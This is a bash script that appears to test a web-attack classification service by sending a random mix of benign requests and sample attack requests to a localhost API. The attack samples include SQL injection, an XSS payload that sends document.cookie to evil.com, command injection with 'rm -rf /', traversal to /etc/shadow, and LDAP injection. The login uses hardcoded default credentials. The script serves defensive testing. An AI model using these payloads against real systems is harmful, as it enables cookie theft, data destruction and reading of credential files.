#!/bin/bash
# IWASMS — Rapid-fire mixed traffic simulation
# Sends 30 requests quickly to test throughput and live feed
BASE_URL="http://localhost:8000/api/v1"
TOKEN=$(curl -s -X POST "$BASE_URL/auth/login/" -H "Content-Type: application/json" -d '{"username":"admin","password":"admin123"}' | python3 -c "import sys,json; print(json.load(sys.stdin)['data']['access'])")

echo "=== Rapid-Fire Traffic Simulation (30 requests) ==="
echo "Watch the Live Feed on the dashboard..."
echo ""

ATTACKS=(
  '{"method":"GET","url":"/api/users?id=1 UNION SELECT * FROM passwords--","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.1.1.1"}'
  '{"method":"GET","url":"/search?q=<script>fetch(\"http://evil.com/steal?\"+document.cookie)</script>","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.1.2.1"}'
  '{"method":"GET","url":"/api/run?cmd=; rm -rf /","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.1.3.1"}'
  '{"method":"GET","url":"/files?p=../../../etc/shadow","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.1.4.1"}'
  '{"method":"POST","url":"/api/pay","headers":{"User-Agent":"Mozilla/5.0","Content-Type":"application/x-www-form-urlencoded"},"body":"amount=99999&to=hacker&token=fake","source_ip":"10.1.5.1"}'
  '{"method":"GET","url":"/api/dir?uid=*)(|(pass=*)","headers":{"User-Agent":"Mozilla/5.0"},"body":"","source_ip":"10.1.6.1"}'
)

NORMALS=(
  '{"method":"GET","url":"/api/products?page=1","headers":{"User-Agent":"Mozilla/5.0 Chrome/118"},"body":"","source_ip":"192.168.1.10"}'
  '{"method":"GET","url":"/api/categories","headers":{"User-Agent":"Mozilla/5.0 Firefox/119"},"body":"","source_ip":"192.168.1.20"}'
  '{"method":"GET","url":"/api/cart","headers":{"User-Agent":"Mozilla/5.0 Safari/605"},"body":"","source_ip":"192.168.1.30"}'
  '{"method":"POST","url":"/api/reviews","headers":{"User-Agent":"Mozilla/5.0 Chrome/118","Content-Type":"application/json"},"body":"{\"rating\":5,\"text\":\"Great product!\"}","source_ip":"192.168.1.40"}'
)

count=0
for i in $(seq 1 30); do
  # 50% chance attack, 50% normal
  if (( RANDOM % 2 == 0 )); then
    payload="${ATTACKS[$((RANDOM % ${#ATTACKS[@]}))]}"
  else
    payload="${NORMALS[$((RANDOM % ${#NORMALS[@]}))]}"
  fi

  curl -s -X POST "$BASE_URL/classify/" \
    -H "Content-Type: application/json" \
    -H "Authorization: Bearer $TOKEN" \
    -d "$payload" > /dev/null &

  count=$((count + 1))
  if (( count % 5 == 0 )); then
    echo "  Sent $count/30 requests..."
    sleep 0.5
  fi
done

wait
echo ""
echo "=== Done. 30 requests classified. Check dashboard. ==="
